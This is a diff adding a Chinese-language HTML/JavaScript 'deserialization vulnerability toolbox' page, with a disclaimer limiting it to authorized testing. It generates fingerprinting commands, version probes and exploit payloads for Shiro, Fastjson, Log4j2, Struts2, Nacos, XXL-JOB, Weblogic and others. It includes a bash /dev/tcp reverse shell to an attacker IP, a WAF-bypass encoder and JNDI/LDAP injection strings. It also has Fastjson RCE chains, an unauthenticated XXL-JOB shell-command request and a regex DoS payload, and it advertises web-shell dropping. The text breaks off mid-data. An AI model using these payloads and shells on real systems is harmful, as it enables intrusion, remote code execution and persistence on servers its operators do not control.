@@ -1,0 +1,1046 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>反序列化漏洞工具箱 | 指纹识别 · 版本探测 · Payload生成 · 利用工具</title>
+<style>
+:root{
+  --bg:#f5f7fa; --panel:#ffffff; --border:#e3e8ef; --text:#16202e; --muted:#64748b;
+  --accent:#2563eb; --accent-soft:#eff6ff; --red:#d92b2b; --red-soft:#fef2f2;
+  --green:#0a7f4f; --green-soft:#ecfdf5; --amber:#b45309; --amber-soft:#fffbeb;
+  --code-bg:#f8fafc; --code-text:#0f172a;
+}
+*{box-sizing:border-box;}
+body{margin:0;background:var(--bg);color:var(--text);
+  font-family:"Microsoft YaHei","PingFang SC","Segoe UI",system-ui,sans-serif;font-size:14px;line-height:1.65;}
+.wrap{max-width:1240px;margin:0 auto;padding:18px 20px 60px;}
+h1{font-size:21px;margin:0 0 4px;}
+h2{font-size:16px;margin:0 0 12px;}
+h3{font-size:14px;margin:18px 0 8px;color:var(--text);}
+.sub{color:var(--muted);font-size:12.5px;margin-bottom:14px;}
+.warn{background:var(--red-soft);border:1px solid #fbc7c7;color:#9b1c1c;
+  padding:9px 13px;border-radius:8px;font-size:12.5px;margin-bottom:16px;}
+.warn b{color:var(--red);}
+
+/* 全局参数栏 */
+.glob{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:14px 16px;margin-bottom:14px;}
+.glob .row{display:flex;flex-wrap:wrap;gap:10px;}
+.glob label{font-size:12px;color:var(--muted);display:block;margin-bottom:3px;}
+.glob .f{flex:1 1 150px;min-width:130px;}
+input[type=text],select,textarea{width:100%;padding:6px 9px;border:1px solid var(--border);
+  border-radius:6px;background:#fff;color:var(--text);font-size:13px;font-family:inherit;}
+textarea{font-family:"Consolas","Courier New",monospace;font-size:12.5px;line-height:1.55;resize:vertical;}
+input[type=text]:focus,select:focus,textarea:focus{outline:2px solid var(--accent-soft);border-color:var(--accent);}
+
+/* Tab */
+.tabs{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:14px;border-bottom:1px solid var(--border);}
+.tab{padding:9px 15px;cursor:pointer;border:none;background:transparent;color:var(--muted);
+  font-size:13.5px;font-family:inherit;border-bottom:2px solid transparent;border-radius:6px 6px 0 0;}
+.tab:hover{color:var(--text);background:var(--accent-soft);}
+.tab.on{color:var(--accent);border-bottom-color:var(--accent);font-weight:600;background:var(--accent-soft);}
+.pane{display:none;} .pane.on{display:block;}
+
+.card{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:14px 16px;margin-bottom:12px;}
+.card.hi{border-color:#fbc7c7;background:var(--red-soft);}
+
+/* 组件选择 chips */
+.chips{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:12px;}
+.chip{padding:5px 12px;border:1px solid var(--border);border-radius:20px;background:#fff;
+  cursor:pointer;font-size:12.5px;color:var(--text);user-select:none;}
+.chip:hover{border-color:var(--accent);color:var(--accent);}
+.chip.on{background:var(--accent);border-color:var(--accent);color:#fff;font-weight:600;}
+
+table{width:100%;border-collapse:collapse;font-size:13px;margin:6px 0;}
+th,td{border:1px solid var(--border);padding:7px 10px;text-align:left;vertical-align:top;}
+th{background:#f1f5f9;font-weight:600;white-space:nowrap;}
+td.k{white-space:nowrap;font-weight:600;width:130px;background:#fafbfc;}
+tr:nth-child(even) td{background:#fcfdfe;}
+
+pre.code{background:var(--code-bg);border:1px solid var(--border);border-radius:8px;
+  padding:10px 12px;overflow-x:auto;font-family:"Consolas","Courier New",monospace;
+  font-size:12.5px;line-height:1.6;color:var(--code-text);margin:6px 0 0;white-space:pre-wrap;word-break:break-all;}
+pre.code.dark{background:#1e293b;color:#e2e8f0;border-color:#334155;}
+
+.btn{display:inline-block;padding:5px 12px;border:1px solid var(--border);background:#fff;
+  border-radius:6px;cursor:pointer;font-size:12.5px;color:var(--text);font-family:inherit;margin:4px 6px 0 0;}
+.btn:hover{border-color:var(--accent);color:var(--accent);background:var(--accent-soft);}
+.btn.pri{background:var(--accent);border-color:var(--accent);color:#fff;}
+.btn.pri:hover{opacity:.88;color:#fff;}
+.btn.red{background:var(--red);border-color:var(--red);color:#fff;}
+.btn.red:hover{opacity:.88;color:#fff;}
+.btns{margin-top:8px;}
+
+.red{color:var(--red);font-weight:600;}
+.green{color:var(--green);font-weight:600;}
+.amber{color:var(--amber);font-weight:600;}
+.muted{color:var(--muted);}
+.small{font-size:12px;}
+.tag{display:inline-block;padding:1px 7px;border-radius:4px;font-size:11.5px;margin-right:4px;
+  background:#f1f5f9;color:var(--muted);border:1px solid var(--border);}
+.tag.r{background:var(--red-soft);color:var(--red);border-color:#fbc7c7;}
+.tag.g{background:var(--green-soft);color:var(--green);border-color:#b7e4cd;}
+.tag.a{background:var(--amber-soft);color:var(--amber);border-color:#fbe3ae;}
+ul.tight{margin:6px 0;padding-left:20px;} ul.tight li{margin:2px 0;}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+@media(max-width:900px){.grid2{grid-template-columns:1fr;}}
+.toast{position:fixed;left:50%;bottom:34px;transform:translateX(-50%);background:#16202e;color:#fff;
+  padding:9px 20px;border-radius:8px;font-size:13px;opacity:0;transition:.25s;pointer-events:none;z-index:99;}
+.toast.on{opacity:1;}
+.pitem{border:1px solid var(--border);border-radius:8px;margin-bottom:10px;background:var(--panel);overflow:hidden;}
+.pitem>.hd{padding:9px 13px;background:#f8fafc;border-bottom:1px solid var(--border);
+  display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap;}
+.pitem>.hd .t{font-weight:600;font-size:13.5px;}
+.pitem>.bd{padding:11px 13px;}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<h1>反序列化漏洞工具箱</h1>
+<div class="sub">指纹识别 · 版本探测 · Payload 生成 · 漏洞利用工具　|　数据源：Day15-17 课程笔记 + 资料文档 + 公开资料整理</div>
+<div class="warn">
+<b>⚠ 使用声明：</b>本工具仅用于<strong>授权的安全测试、企业自查、靶场练习（Vulhub / Pikachu / 内部靶场）</strong>。
+请勿对未授权目标使用。所有生成的命令请在确认有权限的环境执行。
+</div>
+
+<div class="card" style="border-color:#bfdbfe;background:#f8fbff;">
+  <h2 style="margin-top:2px">🆕 新增功能（在「利用中心」页签）</h2>
+  <div class="row">
+    <div class="f" style="flex:1 1 320px">
+      <div style="font-weight:600;margin-bottom:4px">① 全类型自动识别 + 半自动串联 <span class="muted small">（自动编排）</span></div>
+      <div class="small muted">全自动、安全非破坏地探测 SpringBoot / Shiro / Fastjson / XStream 四类漏洞；利用阶段需显式 confirm=1 才会开火，每个漏洞是独立「执行/确认」动作，绝不自动开火。</div>
+    </div>
+    <div class="f" style="flex:1 1 320px">
+      <div style="font-weight:600;margin-bottom:4px">② 反弹 Shell 通道文件传输 <span class="muted small">（Shell 通道）</span></div>
+      <div class="small muted">经已建立的反弹 shell 上传 / 下载文件：优先 curl/wget + 临时 HTTP 服务加速，失败回退 shell 通道 base64 分块。</div>
+    </div>
+    <div class="f" style="flex:1 1 320px">
+      <div style="font-weight:600;margin-bottom:4px">③ 一句话木马自动落地 <span class="muted small">（Shell 通道）</span></div>
+      <div class="small muted">拿到 shell 后向目标 web 根写入 PHP/JSP/ASP 一句话木马（密码 / base64·xor·plain 加密可配），并回显候选可访问 URL。仅落地不执行。</div>
+    </div>
+  </div>
+  <div style="margin-top:10px"><a class="btn pri" href="exploit.html">打开利用中心 →</a> <span class="muted small">进入后选「自动编排 / Shell 通道」分组即可看到新控件。</span></div>
+</div>
+
+<!-- ============ 全局参数 ============ -->
+<div class="glob">
+  <div style="font-weight:600;margin-bottom:9px;font-size:13.5px;">全局参数 <span class="muted small">（填一次，下面所有 Payload 自动替换）</span></div>
+  <div class="row">
+    <div class="f"><label>目标 URL</label><input type="text" id="g_target" value="http://192.168.184.162:8080"></div>
+    <div class="f"><label>攻击机 IP (LHOST)</label><input type="text" id="g_lhost" value="192.168.184.132"></div>
+    <div class="f"><label>反弹 Shell 端口</label><input type="text" id="g_lport" value="9988"></div>
+    <div class="f"><label>JRMP / LDAP 监听端口</label><input type="text" id="g_jrmp" value="10099"></div>
+    <div class="f"><label>DNSLog 域名</label><input type="text" id="g_dns" value="abc123.dnslog.cn"></div>
+    <div class="f"><label>要执行的命令</label><input type="text" id="g_cmd" value="id"></div>
+    <div class="f"><label>Shiro Key</label><input type="text" id="g_key" value="kPH+bIxk5D2deZiIxcaaaA=="></div>
+  </div>
+  <div class="btns"><button class="btn pri" onclick="rerender()">应用参数并刷新</button>
+  <button class="btn" onclick="resetDefault()">恢复默认</button></div>
+</div>
+
+<div class="tabs">
+  <button class="tab on" data-p="fp">🎯 指纹识别</button>
+  <button class="tab" data-p="ver">🔬 版本探测</button>
+  <button class="tab" data-p="pay">💣 Payload 生成</button>
+  <button class="tab" data-p="sh">🐚 反弹Shell / 编码</button>
+  <button class="tab" data-p="flow">📋 利用流程</button>
+  <button class="tab" data-p="tools">🧰 工具库</button>
+</div>
+
+<!-- ============ 指纹识别 ============ -->
+<div class="pane on" id="p-fp">
+  <div class="card">
+    <h2>选择组件（可多选）</h2>
+    <div class="chips" id="fpChips"></div>
+    <div class="btns">
+      <button class="btn pri" onclick="renderFp()">生成指纹识别方案</button>
+      <button class="btn" onclick="selAll('fp')">全选</button>
+      <button class="btn" onclick="selNone('fp')">清空</button>
+    </div>
+  </div>
+  <div id="fpOut"></div>
+</div>
+
+<!-- ============ 版本探测 ============ -->
+<div class="pane" id="p-ver">
+  <div class="card">
+    <h2>选择组件</h2>
+    <div class="chips" id="verChips"></div>
+    <div class="btns">
+      <button class="btn pri" onclick="renderVer()">生成版本探测 Payload</button>
+      <button class="btn" onclick="selAll('ver')">全选</button>
+      <button class="btn" onclick="selNone('ver')">清空</button>
+    </div>
+  </div>
+  <div id="verOut"></div>
+</div>
+
+<!-- ============ Payload 生成 ============ -->
+<div class="pane" id="p-pay">
+  <div class="card">
+    <h2>选择组件</h2>
+    <div class="chips" id="payChips"></div>
+    <div class="btns">
+      <button class="btn pri" onclick="renderPay()">生成利用 Payload</button>
+      <button class="btn" onclick="selAll('pay')">全选</button>
+      <button class="btn" onclick="selNone('pay')">清空</button>
+    </div>
+  </div>
+  <div id="payOut"></div>
+</div>
+
+<!-- ============ 反弹Shell ============ -->
+<div class="pane" id="p-sh">
+  <div class="card">
+    <h2>反弹 Shell 生成</h2>
+    <div class="row" style="display:flex;gap:10px;flex-wrap:wrap;">
+      <div class="f" style="flex:1 1 160px;"><label>Shell 类型</label>
+        <select id="shType" onchange="renderSh()">
+          <option value="bash">bash -i (Linux)</option>
+          <option value="bashifs">bash ${IFS} 无空格（用于 Runtime.exec）</option>
+          <option value="nc">nc -e (Linux)</option>
+          <option value="ncmk">nc mkfifo (无 -e 时)</option>
+          <option value="py">Python</option>
+          <option value="php">PHP</option>
+          <option value="perl">Perl</option>
+          <option value="powershell">PowerShell (Windows)</option>
+        </select>
+      </div>
+    </div>
+    <div class="btns"><button class="btn pri" onclick="renderSh()">生成</button></div>
+  </div>
+  <div id="shOut"></div>
+
+  <div class="card">
+    <h2>编码工具</h2>
+    <div class="row" style="display:flex;gap:10px;flex-wrap:wrap;">
+      <div class="f" style="flex:1 1 200px;"><label>原文本</label><input type="text" id="encIn" value="bash -i >& /dev/tcp/192.168.184.132/9988 0>&1"></div>
+    </div>
+    <div class="btns">
+      <button class="btn" onclick="doEnc('b64')">Base64 编码</button>
+      <button class="btn" onclick="doEnc('b64d')">Base64 解码</button>
+      <button class="btn" onclick="doEnc('url')">URL 编码</button>
+      <button class="btn" onclick="doEnc('urld')">URL 解码</button>
+      <button class="btn" onclick="doEnc('uni')">Unicode 编码（绕 WAF）</button>
+      <button class="btn" onclick="doEnc('hex')">Hex</button>
+    </div>
+    <pre class="code" id="encOut" style="min-height:46px;"></pre>
+  </div>
+</div>
+
+<!-- ============ 利用流程 ============ -->
+<div class="pane" id="p-flow">
+  <div class="card">
+    <h2>选择组件，查看完整利用流程</h2>
+    <div class="chips" id="flowChips"></div>
+    <div class="btns"><button class="btn pri" onclick="renderFlow()">生成流程</button></div>
+  </div>
+  <div id="flowOut"></div>
+</div>
+
+<!-- ============ 工具库 ============ -->
+<div class="pane" id="p-tools">
+  <div class="card">
+    <h2>选择分类</h2>
+    <div class="chips" id="toolChips"></div>
+    <div class="btns"><button class="btn pri" onclick="renderTools()">显示</button>
+    <button class="btn" onclick="selAll('tool')">全选</button></div>
+  </div>
+  <div id="toolOut"></div>
+</div>
+
+</div>
+<div class="toast" id="toast"></div>
+
+<script>
+/* ============================================================
+   数据区
+   ============================================================ */
+const R = s => '<span class="red">'+s+'</span>';
+const G = s => '<span class="green">'+s+'</span>';
+
+/* ---------- 组件指纹库 ---------- */
+const FP = {
+  shiro:{name:'Shiro',icon:'🔐',ports:'业务端口（通用）',
+    points:[
+      ['响应头（最强）','<span class="red">Set-Cookie: rememberMe=deleteMe;</span> —— Shiro 发现请求没带合法 rememberMe 时下发 deleteMe 清理 Cookie'],
+      ['主动探测','<span class="red">请求包 Cookie 手动加 rememberMe=deleteMe;</span> 再发，看响应是否出现 Set-Cookie: rememberMe=deleteMe'],
+      ['登录页特征','勾选 Remember me / 记住我 后抓包，响应里出现 rememberMe'],
+      ['报错指纹','响应中出现 org.apache.shiro、Shiro'],
+      ['工具','ShiroExploit / ShiroAttack2 / shiro_attack / Burp 插件；Wappalyzer、whatweb'],
+      ['测绘语法','app="Apache-Shiro"　body="rememberMe=deleteMe"　header="rememberMe"']],
+    paths:['/login','/doLogin','/','/admin'],
+    cmds:[
+      ['单目标检测','curl -s -i "{{target}}" -H "Cookie: rememberMe=deleteMe;" | grep -i "rememberMe"'],
+      ['批量检测','for u in $(cat urls.txt); do echo -n "$u : "; curl -s -I "$u" -H "Cookie: rememberMe=deleteMe;" | grep -io "rememberMe=deleteMe" || echo "-"; done'],
+      ['nuclei','nuclei -u {{target}} -t http/exposures/configs/ -tags shiro\n# 或：nuclei -l urls.txt -tags shiro,deserialization'],
+      ['Python 探测','python deserkit.py scan -u {{target}} -c shiro']]},
+
+  fastjson:{name:'Fastjson',icon:'📦',ports:'业务端口',
+    points:[
+      ['数据特征','站点传输/接收 <span class="red">JSON</span> 数据（登录、查询、提交表单处抓包看 Content-Type: application/json）'],
+      ['报错指纹','响应中出现 <span class="red">com.alibaba.fastjson</span>、fastjson.JSONException、autoType is not support'],
+      ['框架推断','Java 站点 + JSON 交互，优先怀疑 Fastjson（国内 Java 站约 70%）'],
+      ['触发点','任何接收 JSON 的 POST 接口，Content-Type 改为 application/json'],
+      ['测绘语法','app="Fastjson"　app="Alibaba-FastJSON"']],
+    paths:['/','/login','/api/'],
+    cmds:[
+      ['报错探测（看是否回显 fastjson）','curl -s -X POST "{{target}}" -H "Content-Type: application/json" -d \'{"@type":"java.lang.AutoCloseable"\''],
+      ['DNSLog 探测','curl -s -X POST "{{target}}" -H "Content-Type: application/json" -d \'{"@type":"java.net.Inet4Address","val":"{{dns}}"}\''],
+      ['nuclei','nuclei -u {{target}} -tags fastjson'],
+      ['Python 探测','python deserkit.py scan -u {{target}} -c fastjson']]},
+
+  log4j2:{name:'Log4j2',icon:'📝',ports:'业务端口',
+    points:[
+      ['特征','<span class="red">无明显指纹，只能盲打</span>：任何被写进日志的输入点都可能是入口'],
+      ['注入点清单','User-Agent / Referer / X-Forwarded-For / Cookie / 用户名 / 搜索框 / 参数值 / 请求头全部字段'],
+      ['Java 栈确认','报错堆栈出现 org.apache.logging.log4j'],
+      ['判定','<span class="red">DNSLog 收到请求 = 存在 Log4j2 且可触发 Lookup</span>（注意：仅证明出网，不代表一定 RCE，需结合 JDK 版本）'],
+      ['测绘语法','app="Log4j2"　（更多靠批量盲打）']],
+    paths:['/','/login','/search'],
+    cmds:[
+      ['UA 注入','curl -s "{{target}}" -H \'User-Agent: ${jndi:ldap://{{dns}}/a}\''],
+      ['全头批量注入','curl -s "{{target}}" \\\n  -H \'User-Agent: ${jndi:ldap://ua.{{dns}}/a}\' \\\n  -H \'Referer: ${jndi:ldap://ref.{{dns}}/a}\' \\\n  -H \'X-Forwarded-For: ${jndi:ldap://xff.{{dns}}/a}\' \\\n  -H \'X-Api-Version: ${jndi:ldap://xav.{{dns}}/a}\''],
+      ['nuclei','nuclei -u {{target}} -tags log4j,cve-2021-44228'],
+      ['Python 探测','python deserkit.py scan -u {{target}} -c log4j2']]},
+
+  springboot:{name:'SpringBoot',icon:'🍃',ports:'8080 / 80 / 443',
+    points:[
+      ['报错页面','<span class="red">Whitelabel Error Page</span>（访问一个不存在的路径即可触发）'],
+      ['图标','<span class="red">绿色叶子图标</span> / favicon.ico 为叶子'],
+      ['响应体','默认错误响应为 JSON：{"timestamp":...,"status":404,"error":"Not Found"}'],
+      ['响应头','部分版本暴露 X-Application-Context'],
+      ['工具','SBSCAN / spring-scan / YYBaby-Spring_Scan / SpringBootVul-GUI'],
+      ['测绘语法','app="Spring-Boot"　body="Whitelabel Error Page"　icon_hash leaf']],
+    paths:['/actuator','/actuator/env','/actuator/beans','/actuator/mappings','/actuator/heapdump','/actuator/gateway/routes','/actuator/health','/env','/heapdump'],
+    cmds:[
+      ['Actuator 探测','for p in actuator actuator/env actuator/heapdump actuator/beans actuator/mappings; do echo -n "/$p => "; curl -s -o /dev/null -w "%{http_code}\\n" "{{target}}/$p"; done'],
+      ['错误页探测','curl -s "{{target}}/not-exist-123" | grep -io "Whitelabel Error Page"'],
+      ['SBSCAN 专扫','python3 SBSCAN.py -u {{target}}\n# https://github.com/sule01u/SBSCAN'],
+      ['nuclei','nuclei -u {{target}} -tags springboot,actuator'],
+      ['Python 探测','python deserkit.py scan -u {{target}} -c springboot']]},
+
+  jboss:{name:'JBoss / WildFly',icon:'☕',ports:'<span class="red">8080 / 9990</span>',
+    points:[
+      ['默认页面','标题 <span class="red">Welcome to JBoss AS</span> / Welcome to WildFly'],
+      ['路径','<span class="red">/jmx-console/</span>（默认 admin/admin）、<span class="red">/invoker/readonly</span>、/invoker/EJBInvokerServlet、/jbossmq-httpil/HTTPServerILServlet'],
+      ['HTTP 响应头','Server: JBoss / WildFly（<span class="red">万能答案</span>）'],
+      ['端口','默认 8080（HTTP）/ 9990（管理端）'],
+      ['工具','指纹工具 / 漏扫工具（<span class="red">万能答案</span>）、nmap -sV'],
+      ['测绘语法','app="JBoss"　title="Welcome to JBoss AS"　port="8080"']],
+    paths:['/','/jmx-console/','/invoker/readonly','/invoker/EJBInvokerServlet','/jbossmq-httpil/HTTPServerILServlet','/admin-console/'],
+    cmds:[
+      ['路径批量探测','for p in "" "jmx-console/" "invoker/readonly" "invoker/EJBInvokerServlet" "jbossmq-httpil/HTTPServerILServlet"; do echo -n "/$p => "; curl -s -o /dev/null -w "%{http_code}\\n" "{{target}}/$p"; done'],
+      ['nmap','nmap -sV -p 8080,9990 {{target}}'],
+      ['nuclei','nuclei -u {{target}} -tags jboss'],
+      ['Python 探测','python deserkit.py scan -u {{target}} -c jboss']]},
+
+  jackson:{name:'Jackson',icon:'🧩',ports:'业务端口',
+    points:[
+      ['报错指纹','畸形 JSON 触发 <span class="red">com.fasterxml.jackson</span>、JsonMappingException、MismatchedInputException、InvalidTypeIdException'],
+      ['依赖识别','拿到 WEB-INF/lib 看到 <span class="red">jackson-databind-x.x.x.jar</span>'],
+      ['@class 探测','JSON 里加 "@class":"xxx"，服务端据此实例化 → <span class="red">说明开启了多态类型（高危）</span>'],
+      ['框架推断','Spring Boot 默认集成 Jackson'],
+      ['关键区别','<span class="red">Jackson 默认不开启多态类型（需 enableDefaultTyping），fastjson 默认开启 autotype</span>']],
+    paths:['/','/api/'],
+    cmds:[
+      ['报错探测','curl -s -X POST "{{target}}" -H "Content-Type: application/json" -d \'{"a":[\''],
+      ['@class 探测','curl -s -X POST "{{target}}" -H "Content-Type: application/json" -d \'{"obj":{"@class":"java.net.Inet4Address","val":"{{dns}}"}}\''],
+      ['Python 探测','python deserkit.py scan -u {{target}} -c jackson']]},
+
+  nacos:{name:'Nacos',icon:'⚙️',ports:'<span class="red">8848</span>',
+    points:[
+      ['端口','<span class="red">8848</span>'],
+      ['路径','<span class="red">/nacos/</span> 或 /nacos/index.html 出现 Nacos 登录页'],
+      ['接口','/nacos/v1/console/health 返回健康信息；/nacos/v1/ns/operator/metrics 返回指标'],
+      ['未授权接口','<span class="red">/nacos/v1/auth/users?pageNo=1&pageSize=9</span> —— 能列出用户即未授权'],
+      ['页面特征','favicon 为 Nacos 图标，HTML/响应头含 "Nacos"'],
+      ['常见域名','nacos.xxx.com、config.xxx.com'],
+      ['测绘语法','app="Nacos"　title="Nacos"　port="8848"']],
+    paths:['/nacos/','/nacos/index.html','/nacos/v1/console/health','/nacos/v1/ns/operator/metrics','/nacos/v1/auth/users?pageNo=1&pageSize=9','/nacos/v1/cs/configs'],
+    cmds:[
+      ['一键探测','curl -s -o /dev/null -w "nacos首页:%{http_code}\\n" "{{target2}}/nacos/"\ncurl -s "{{target2}}/nacos/v1/console/health"\ncurl -s "{{target2}}/nacos/v1/auth/users?pageNo=1&pageSize=9"'],
+      ['鉴权绕过测试','curl -s "{{target2}}/nacos/v1/auth/users?pageNo=1&pageSize=9" -H "User-Agent: Nacos-Server"'],
+      ['nuclei','nuclei -u {{target2}} -tags nacos'],
+      ['Python 探测','python deserkit.py scan -u {{target2}} -c nacos']]},
+
+  struts2:{name:'Struts2',icon:'🎭',ports:'业务端口',
+    points:[
+      ['URL 后缀','<span class="red">.action / .do</span>（/login.action、/index.do）'],
+      ['报错指纹','访问不存在的 action 返回 <span class="red">"Struts Problem Report"</span> 或页面含 "Apache Struts"'],
+      ['响应头','部分版本暴露 X-Struts 相关、OGNL 报错堆栈'],
+      ['主动探测','向参数或 Content-Type 注入无害 OGNL（如 %{1+1}）看响应是否计算出 2'],
+      ['工具','whatweb / wappalyzer / 浏览器插件；专扫 Struts2Scan'],
+      ['测绘语法','app="Struts2"　body="Struts Problem Report"']],
+    paths:['/index.action','/login.action','/showcase.action','/index.do'],
+    cmds:[
+      ['后缀探测','for p in "index.action" "login.action" "index.do" "struts2-showcase/index.action"; do echo -n "/$p => "; curl -s -o /dev/null -w "%{http_code}\\n" "{{target}}/$p"; done'],
+      ['OGNL 无害探测','curl -s -X POST "{{target}}/index.action" -H \'Content-Type: %{(#a=1+1).(#b=@java.lang.String@valueOf(#a))}\' | head -50'],
+      ['whatweb','whatweb {{target}}'],
+      ['Struts2Scan','python3 Struts2Scan.py -u {{target}}'],
+      ['nuclei','nuclei -u {{target}} -tags struts,rce -severity critical'],
+      ['Python 探测','python deserkit.py scan -u {{target}} -c struts2']]},
+
+  xxljob:{name:'XXL-JOB',icon:'⏰',ports:'<span class="red">8080（调度中心） / 9999（执行器）</span>',
+    points:[
+      ['调度中心','默认 8080，访问 <span class="red">/xxl-job-admin/</span> 出现 "XXL-JOB" 登录页'],
+      ['执行器','默认 <span class="red">9999</span>，直接请求 http://ip:9999/run 看响应'],
+      ['鉴权探测（关键）','访问执行器 /run：返回 <span class="red">"The job trigger request is valid"</span> = 未鉴权高危；返回 "invalid access token" = 已配 token'],
+      ['指纹','页面标题含 XXL-JOB，响应头/页面出现 xxl-job 关键字'],
+      ['测绘语法','title="XXL-JOB"　app="XXL-JOB"　port="9999"']],
+    paths:['/xxl-job-admin/','/xxl-job-admin/toLogin','/run'],
+    cmds:[
+      ['调度中心探测','curl -s -o /dev/null -w "%{http_code}\\n" "{{target2}}/xxl-job-admin/toLogin"'],
+      ['执行器探测（默认 9999）','curl -s -o /dev/null -w "%{http_code}\\n" "http://HOST:9999/run"'],
+      ['执行器鉴权探测','curl -s -X POST "http://HOST:9999/run" -H "Content-Type: application/json" -d \'{"jobId":1,"executorHandler":"demoJobHandler","glueType":"GLUE_SHELL","glueSource":"echo hi","executorParams":""}\''],
+      ['nuclei','nuclei -u {{target2}} -tags xxl-job'],
+      ['Python 探测','python deserkit.py scan -u {{target2}} -c xxljob']]},
+
+  weblogic:{name:'Weblogic',icon:'🌐',ports:'<span class="red">7001</span>（T3 协议）',
+    points:[
+      ['端口','<span class="red">7001</span>（T3 / HTTP / 控制台）'],
+      ['路径','<span class="red">/console/</span> 管理控制台；/wls-wsat/CoordinatorPortType（CVE-2017-10271）、/_async/AsyncResponseService（CVE-2019-2725）'],
+      ['T3 协议','nmap --script weblogic-t3-info -p 7001 可提取版本'],
+      ['响应头','Server: Oracle WebLogic Server / WebLogic'],
+      ['测绘语法','app="WebLogic"　port="7001"　title="WebLogic Server"']],
+    paths:['/console/','/console/login/LoginForm.jsp','/wls-wsat/CoordinatorPortType','/_async/AsyncResponseService','/uddiexplorer/'],
+    cmds:[
+      ['T3 版本探测','nmap -n -v -p 7001 --script weblogic-t3-info {{target2}}'],
+      ['路径探测','for p in "console/" "console/login/LoginForm.jsp" "wls-wsat/CoordinatorPortType" "_async/AsyncResponseService" "uddiexplorer/"; do echo -n "/$p => "; curl -s -o /dev/null -w "%{http_code}\\n" "{{target2}}/$p"; done'],
+      ['nuclei','nuclei -u {{target2}} -tags weblogic'],
+      ['Python 探测','python deserkit.py scan -u {{target2}} -c weblogic']]}
+};
+
+/* ---------- 版本探测 Payload 库 ---------- */
+const VER = {
+  fastjson:{name:'Fastjson',items:[
+    {t:'DNSLog 通用出网探测',note:'能收到 DNS 请求 = 目标出网且能触发 @type。<span class="red">注意：仅证明出网，不代表可利用（新版本也能发 DNS）</span>',
+     p:'{"@type":"java.net.Inet4Address","val":"{{dns}}"}',how:'POST 到任意接收 JSON 的接口，Content-Type: application/json'},
+    {t:'DNS 探测（InetSocketAddress / URL 变体）',note:'多试几个变体，绕过黑名单',
+     p:'{"@type":"java.net.InetSocketAddress"{"address":,"val":"{{dns}}"}',how:'同上'},
+    {t:'DNS 探测（URL 变体，>=1.2.37 可用）',note:'此 POC 出网说明 fastjson >= 1.2.37',
+     p:'{{"@type":"java.net.URL","val":"http://{{dns}}"}:0',how:'同上'},
+    {t:'URL 变体 2',note:'',p:'{{"@type":"java.net.URL","val":"http://{{dns}}"}:0',how:'同上'},
+    {t:'显错探测版本号（最快）',note:'<span class="red">提交后看报错里是否带出 fastjson 版本号</span>',
+     p:'{"@type": "java.lang.AutoCloseable"',how:'缺一个右括号，故意触发解析异常'},
+    {t:'显错探测 2',note:'',p:'["test":1]',how:'非法 JSON'},
+    {t:'布尔判定 1：1.2.24-1.2.47 vs 1.2.48-1.2.83',note:'<span class="red">不报错 = 1.2.24~1.2.47（java.lang.Class 绕过）；报错 = 1.2.48~1.2.83</span>',
+     p:'{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{dns}}/t","autoCommit":true}}',how:'POST 观察是否报错'},
+    {t:'布尔判定 2：1.2.24-1.2.68 vs 1.2.70-1.2.83',note:'<span class="red">不报错 = 1.2.24~1.2.68；报错 = 1.2.70~1.2.83</span>',
+     p:'{"zero":{"@type":"java.lang.AutoCloseable","@type":"java.io.ByteArrayOutputStream"}}',how:'POST 观察是否报错'},
+    {t:'布尔判定 3：1.2.83/1.2.24 vs 1.2.25-1.2.80',note:'<span class="red">不报错 = 1.2.83 或 1.2.24；报错 = 1.2.25~1.2.80</span>',
+     p:'{"zero":{"@type":"java.lang.Exception","@type":"org.XxException"}}',how:'POST 观察是否报错'},
+    {t:'延时探测（不出网时判断 <=1.2.47）',note:'访问不常见外网 IP 会延迟几秒，访问 127.0.0.1 瞬间返回 → 证明可用且 <span class="red">版本 <= 1.2.47</span>',
+     p:'{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://137.30.0.1:9999/POC","autoCommit":true}}',how:'对比 ldap://127.0.0.1 与外网 IP 的响应时间'},
+    {t:'正则 DoS 延时（1.2.36-1.2.62）',note:'<span class="red">慎用</span>，a 越多延迟越明显。有延迟说明 <= 1.2.59，间接说明 <= 1.2.68 值得一试',
+     p:'{"regex":{"$ref":"$[blue rlike \'^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$\']"},"blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}',how:'逐步增加 a 的数量，注意别打垮生产'},
+    {t:'1.2.47 版本专用 DNS 链',note:'',p:'[{ "@type": "java.lang.Class", "val": "java.io.ByteArrayOutputStream" }, { "@type": "java.io.ByteArrayOutputStream" }, { "@type": "java.net.InetSocketAddress" { "address":, "val": "{{dns}}" } }]',how:'POST'},
+    {t:'1.2.68 版本专用 DNS 链',note:'',p:'[{ "@type": "java.lang.AutoCloseable", "@type": "java.io.ByteArrayOutputStream" }, { "@type": "java.io.ByteArrayOutputStream" }, { "@type": "java.net.InetSocketAddress" { "address":, "val": "{{dns}}" } }]',how:'POST'},
+    {t:'版本速查结论',note:'<span class="red">&lt;1.2.24 无限制 ｜ 1.2.24-1.2.47 java.lang.Class 绕过 ｜ 1.2.48-1.2.68 java.lang.AutoCloseable 绕过 ｜ 1.2.70-1.2.72 无链 ｜ 1.2.73-1.2.80 java.lang.Exception 绕过 ｜ 1.2.83 无漏洞版本</span>',
+     p:'',how:'配合上面的布尔判定使用'}
+  ]},
+  log4j2:{name:'Log4j2',items:[
+    {t:'基础探测（LDAP）',note:'<span class="red">DNSLog 收到请求即存在</span>',p:'${jndi:ldap://{{dns}}/a}',how:'塞进 UA / 参数 / 用户名等任意会被记录的位置'},
+    {t:'基础探测（RMI）',note:'',p:'${jndi:rmi://{{dns}}/a}',how:'同上'},
